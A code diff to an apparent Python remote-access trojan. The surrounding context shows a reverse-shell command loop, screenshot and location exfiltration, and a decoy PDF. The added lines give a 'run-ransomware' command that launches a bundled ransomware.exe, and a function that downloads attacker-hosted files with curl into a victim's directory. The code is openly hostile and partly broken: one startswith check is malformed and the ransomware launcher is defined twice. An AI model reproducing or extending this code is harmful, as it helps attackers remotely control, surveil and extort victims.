@@ -41,6 +41,13 @@ banner = r"""
       - Clear console.
 =====================================================
 """
+def run_ransomware():
+    if hasattr(sys, "_MEIPASS"):
+        base_path = sys._MEIPASS
+    else:
+        base_path = os.path.dirname(os.path.abspath(__file__))
+    exe_path = os.path.join(base_path, "ransomware.exe")
+    subprocess.run([exe_path])
 def put_files_in_desktop(args):
     chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
     desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
@@ -56,6 +63,30 @@ def put_files_in_desktop(args):
        filename = f"{name}.{ext}"
        path = os.path.join(desktop_path, filename)
        subprocess.run(["curl", "-L", "-o", path, url])
+def put_files_in_dir(args):
+    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    if len(args) < 2:
+        return False  
+    target_dir = args[1]
+    files_to_put = args[2:]
+    try:
+        os.makedirs(target_dir, exist_ok=True)
+    except Exception:
+        return False
+    urls = [f"{SERVER_URL}/uploads/{file}" for file in files_to_put]
+    for url in urls:
+        name = "".join(random.choice(chars) for _ in range(10))
+        ext = url.split(".")[-1]
+        filename = f"{name}.{ext}"
+        path = os.path.join(target_dir, filename)
+        result = subprocess.run(
+            ["curl", "-L", "-o", path, url],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
+        if result.returncode != 0:
+            return False  
+    return True  
 def send_screenshot():
     filename = f"{random.randint(100000,999999)}.png"
     full_path = os.path.abspath(filename)
@@ -178,6 +209,13 @@ def open_pdf():
         base_path = os.path.dirname(__file__)
     pdf_path = os.path.join(base_path, "Fake.pdf")
     webbrowser.open(pdf_path)
+def run_ransomware():
+    if hasattr(sys, "_MEIPASS"):
+        base_path = sys._MEIPASS
+    else:
+        base_path = os.path.dirname(__file__)
+    ransomware_path = os.path.join(base_path, "ransomware.exe")
+    subprocess.run([ransomware_path])
 def open_browser(link):
     webbrowser.open(link)
 def connect_back():
@@ -191,11 +229,6 @@ def connect_back():
                 continue
             if cmd.lower() == "help":
                 s.send(banner.encode())
-            if cmd.lower().startswith("put-files-desktop"):
-                args_files = cmd.split()
-                put_files_in_desktop(args_files)
-                s.send(b"The files put on victim's device\n")
-                continue
             if cmd == "get-screenshot":
                 get_location_and_send()
                 s.send(b"Screenshoot has been sent to the server\n")
@@ -261,10 +294,15 @@ def connect_back():
                 for folder in parts:
                     subprocess.run(["cmd", "/c", "mkdir", folder], shell=True)
                 continue
+            if cmd.lower().startswith() == "put_files_in_dir":
+                args = cmd.split(' ')
+                put_files_in_dir(args)
+                continue
             if cmd.lower() == "run-ransomware":
-                pass
+                run_ransomware()
+                continue
             if cmd.lower() == "change-background":
-                pass
+                continue
             if cmd.lower() == "exit":
                 break
             output = subprocess.run(
